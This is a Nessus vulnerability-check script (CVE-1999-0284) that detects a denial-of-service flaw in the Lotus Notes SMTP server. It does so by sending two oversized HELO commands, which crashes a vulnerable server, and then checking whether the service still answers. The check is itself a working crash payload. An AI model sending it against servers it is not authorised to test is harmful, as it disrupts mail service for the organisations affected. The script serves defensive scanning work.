#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10162);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-1999-0284");
 name["english"] = "Notes MTA denial";
 name["francais"] = "Déni de service contre le MTA de Notes";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to perform a denial of service against the remote
SMTP server by sending it two HELO commands followed by a too long argument.


This problem allows an attacker to prevent your SMTP server from sending or 
receiving emails, thus preventing you from working properly.

Solution : contact your vendor for a patch, or change your MTA.

Risk factor : Medium";

 desc["francais"] = "Il s'est avéré possible
de créer un déni de service de la part du
server SMTP distant en lui envoyant deux
commandes HELO suivies d'un argument trop
long.

Un pirate peut utiliser ce problème
pour empecher votre réseau d'envoyer
et de recevoir des emails, vous 
empechant ainsi de travailler
correctement.

Solution : contactez votre vendeur pour un
patch, ou changez de MTA.

Facteur de risque : Moyen";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote SMTP server";
 summary["francais"] = "Fait planter le serveur SMTP distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  s = smtp_recv_banner(socket:soc);
  if("220 " >!< s){
  	close(soc);
	exit(0);
	}
  c = string("HELO ", crap(510), "\r\n");
  z = crap(length:510, data:"Y");
  d = string("HELO ", z, "\r\n");
  send(socket:soc, data:c);
  s = recv_line(socket:soc, length:1024);
  if ( ! s ) exit(0);
  send(socket:soc, data:d);
  close(soc);
  
  flaw = 0;
  soc2 = open_sock_tcp(port);
  if(!soc2)flaw = 1;
  else {
  	a = recv_line(socket:soc2, length:1024);
	if(!a)flaw = 1;
 	close(soc2);
       }
  
  if(flaw)security_warning(port);
  }
 }
	
